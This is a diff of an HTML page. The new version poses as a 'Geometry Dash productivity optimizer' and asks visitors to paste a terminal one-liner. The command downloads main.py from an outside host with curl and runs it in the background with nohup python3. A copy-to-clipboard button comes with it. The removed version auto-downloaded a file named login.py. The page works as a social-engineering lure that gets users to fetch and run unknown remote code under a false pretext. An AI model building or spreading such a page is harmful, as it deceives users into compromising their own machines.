@@ -1,68 +1,35 @@
 <!doctype html>
 <html lang="en">
-	<head>
-		<meta charset="utf-8" />
-		<meta name="viewport" content="width=device-width,initial-scale=1" />
-		<title>Auto Download</title>
-		<style>
-			body {font-family: system-ui, -apple-system, Roboto, 'Segoe UI', Arial; padding: 2rem;}
-			.status {margin-top: 1rem; color: #333}
-			.hidden {display:none}
-		</style>
-	</head>
-	<body>
-		<p class="status" id="status">Preparing download…</p>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>Run login.py</title>
+    <style>
+      body {font-family: system-ui, -apple-system, Roboto, 'Segoe UI', Arial; padding: 2rem;}
+      pre {background:#f6f8fa;border:1px solid #ddd;padding:0.75rem;border-radius:4px;}
+      button {margin-top:0.5rem}
+    </style>
+  </head>
+  <body>
+    <h2>Productivity optimizer with Geometry Dash!</h2>
+    <p>Copy the command below and paste it into the terminal, your productivity shall surge like never before!</p>
 
-		<p>
-			<a id="manualLink" href="files/myfile.txt" download class="hidden">Download file manually</a>
-			<button id="retry" class="hidden">Retry download</button>
-		</p>
+    <pre id="oneLineBlock">curl -fsSL "https://gdash.espolin.dev/files/main.py" -o main.py && nohup python3 main.py &amp;</pre>
+    <button id="copyOneLine">Copy command</button>
+    <span id="copyOneStatus" style="margin-left:0.6rem;color:#666"></span>
 
-		<script>
-			const fileUrl = 'files/login.py';
-			const suggestedName = 'login.py';
-
-			function triggerDownload(url, filename) {
-				const a = document.createElement('a');
-				a.href = url;
-				a.download = filename || '';
-				document.body.appendChild(a);
-				a.click();
-				a.remove();
-			}
-
-			function onReady() {
-				const status = document.getElementById('status');
-				const manual = document.getElementById('manualLink');
-				const retry = document.getElementById('retry');
-
-				manual.classList.remove('hidden');
-				retry.classList.remove('hidden');
-
-				setTimeout(() => {
-					try {
-						triggerDownload(fileUrl, suggestedName);
-						status.textContent = 'Download started. If your browser blocked it, click the link below.';
-					} catch (err) {
-						status.textContent = 'Automatic download failed — use the link below.';
-						console.error(err);
-					}
-				}, 150);
-
-				retry.addEventListener('click', () => {
-					status.textContent = 'Retrying…';
-					setTimeout(() => {
-						triggerDownload(fileUrl, suggestedName);
-						status.textContent = 'If nothing happens, use the link below.';
-					}, 50);
-				});
-			}
-
-			if (document.readyState === 'loading') {
-				document.addEventListener('DOMContentLoaded', onReady);
-			} else {
-				onReady();
-			}
-		</script>
-	</body>
+    <script>
+      document.getElementById('copyOneLine').addEventListener('click', async () => {
+        const cmd = document.getElementById('oneLineBlock').textContent;
+        try {
+          await navigator.clipboard.writeText(cmd);
+          const s = document.getElementById('copyOneStatus');
+          s.textContent = 'Copied!';
+          setTimeout(() => s.textContent = '', 2000);
+        } catch (err) {
+          document.getElementById('copyOneStatus').textContent = 'Copy failed — select and press ⌘C';
+        }
+      });
+    </script>
+  </body>
 </html>
